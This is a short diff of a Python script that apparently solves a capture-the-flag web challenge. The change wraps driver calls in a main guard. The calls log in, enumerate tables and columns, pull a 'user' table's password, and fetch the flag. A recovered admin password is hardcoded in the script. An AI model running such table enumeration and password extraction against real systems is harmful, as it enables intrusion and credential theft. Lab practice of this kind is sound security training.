@@ -222,12 +222,13 @@ def get_flag(url: str, password: str, username: str = "admin"):
 
     return soup.find("h3").text
 
-client = login(client=client, url=url)
+if __name__ == "__main__":
 
-#tables = get_tables(client=client, url=product_url) # [..., user, ...]
-#columns = get_columns(client=client, url=product_url, table="user") # ["id", "username", "password"]
-#password = get_password(client=client, url=product_url, table="user") # rx4FnLg$Rh
+    client = login(client=client, url=url)
 
-flag = get_flag(url=url, password="rx4FnLg$Rh")
-print(flag)
+    #tables = get_tables(client=client, url=product_url) # [..., user, ...]
+    #columns = get_columns(client=client, url=product_url, table="user") # ["id", "username", "password"]
+    #password = get_password(client=client, url=product_url, table="user") # rx4FnLg$Rh
 
+    flag = get_flag(url=url, password="rx4FnLg$Rh")
+    print(flag)
